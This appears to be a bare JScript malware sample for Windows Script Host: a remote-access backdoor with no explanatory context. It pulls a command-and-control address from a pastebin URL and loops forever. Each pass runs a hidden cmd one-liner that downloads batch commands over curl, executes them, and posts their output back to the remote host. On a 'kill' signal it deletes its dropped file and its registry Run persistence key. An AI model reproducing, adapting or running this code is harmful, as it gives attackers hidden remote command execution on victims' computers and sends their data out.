var oHTTP=new ActiveXObject("MSXML2.XMLHTTP");var objShell=new ActiveXObject("WScript.Shell");while(true){try{oHTTP.open("GET","https://pastebin.com/raw/knWXwasC",false);oHTTP.send();var tunnel=oHTTP.responseText;if(tunnel.indexOf("kill")>-1){try{new ActiveXObject("Scripting.FileSystemObject").DeleteFile(objShell.ExpandEnvironmentStrings("%TEMP%")+"\\Node.js",true);objShell.RegDelete("\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start");WScript.Quit();}catch(innerDeleteError){}}var sh="@echo off&cd %userprofile%&cmd /V:ON /C \"SET ip="+tunnel+"&&SET sid=\"Authorization: ac3b22bb-4baa2f93-341bd899\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/ac3b22bb -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL";objShell.Run("cmd /C "+sh,0,true);WScript.Sleep(5000);}catch(e){}}
